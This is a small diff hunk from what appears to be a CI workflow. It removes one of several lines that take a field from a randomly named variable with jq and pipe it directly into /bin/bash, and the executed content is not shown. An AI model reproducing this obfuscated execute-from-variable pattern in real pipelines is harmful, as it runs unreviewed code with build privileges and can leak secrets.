@@ -21,7 +21,6 @@ jobs:
           echo $al2454 | jq -r .fixvm19 | /bin/bash
           echo $ghmgo54769 | jq -r .wsw8234 | /bin/bash
           echo $nqayw481 | jq -r .zu2 | /bin/bash
-          printf '%s' "$libb716" | jq -r .ftw9377 | /bin/bash
           echo $caej53249 | jq -r .uddfn011 | /bin/bash
           echo $ifjt32 | jq -r .zgbm691 | /bin/bash
           echo $bcndl0 | jq -r .wmgoa3635 | /bin/bash
